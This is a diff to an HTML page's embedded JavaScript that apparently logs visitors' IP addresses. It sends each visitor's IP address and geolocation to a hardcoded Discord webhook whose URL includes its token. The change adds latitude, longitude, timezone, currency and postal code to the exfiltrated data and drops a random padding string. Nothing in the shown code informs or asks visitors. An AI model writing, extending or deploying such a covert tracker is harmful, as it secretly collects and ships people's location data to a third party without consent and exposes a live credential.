@@ -20,23 +20,27 @@
           const flagEmoji = getFlagEmoji(data.country_code);
           const city = data.city;
           const region = data.region;
+          const latitude = data.latitude;
+          const longitude = data.longitude;
+          const timezone = data.timezone;
+          const currency = data.currency;
+          const postalCode = data.postal;
           const webhookUrl = 'https://discord.com/api/webhooks/1112433220747792535/f0GSFHDk7Y5p7YNV2xzoIjy-7Kl6v1gRJyK2jONEyMxhjGiEbvffgJNA9N4ZeaGJg_i9';
-          const randomString = generateRandomString();
-          
-          const formData = new FormData();
-          formData.append('payload_json', JSON.stringify({
+          const messagePayload = {
             embeds: [
               {
                 title: 'IP Information',
-                description: `IP Address: ${ipAddress}\n${flagEmoji} Country: ${country}\nCity: ${city}\nRegion: ${region}\n\n${randomString}`,
+                description: `IP Address: ${ipAddress}\n${flagEmoji} Country: ${country}\nCity: ${city}\nRegion: ${region}\nLatitude: ${latitude}\nLongitude: ${longitude}\nTimezone: ${timezone}\nCurrency: ${currency}\nPostal Code: ${postalCode}`,
                 color: 16711680
               }
             ]
-          }));
-          
+          };
           fetch(webhookUrl, {
             method: 'POST',
-            body: formData
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(messagePayload)
           });
         });
     }
@@ -44,16 +48,6 @@
     function getFlagEmoji(countryCode) {
       const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
       return String.fromCodePoint(...codePoints);
-    }
-
-    function generateRandomString() {
-      const length = 5000; // Adjust the length of the string as desired
-      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-      let result = '';
-      for (let i = 0; i < length; i++) {
-        result += characters.charAt(Math.floor(Math.random() * characters.length));
-      }
-      return result;
     }
   </script>
 </head>
